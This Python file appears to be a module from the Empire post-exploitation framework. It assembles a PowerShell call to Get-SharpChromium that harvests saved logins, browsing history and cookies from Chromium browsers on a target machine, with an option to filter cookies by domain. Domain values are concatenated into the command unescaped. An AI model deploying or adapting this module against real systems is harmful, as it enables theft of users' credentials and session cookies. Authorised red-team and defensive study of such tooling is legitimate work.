import logging

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

log = logging.getLogger(__name__)


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        script_end = " Get-SharpChromium"

        # check type
        if params["Type"].lower() not in ["all", "logins", "history", "cookies"]:
            log.error("Invalid value of Type, use default value: all")
            params["Type"] = "all"
        script_end += " -Type " + params["Type"]
        # check domain
        if params["Domains"].lower() != "":
            if params["Type"].lower() != "cookies":
                log.error("Domains can only be used with Type cookies")
            else:
                script_end += " -Domains ("
                for domain in params["Domains"].split(","):
                    script_end += "'" + domain + "',"
                script_end = script_end[:-1]
                script_end += ")"

        outputf = params.get("OutputFunction", "Out-String")
        script_end += (
            f" | {outputf} | "
            + '%{$_ + "`n"};"`n'
            + str(module.name.split("/")[-1])
            + ' completed!"'
        )

        return script, script_end
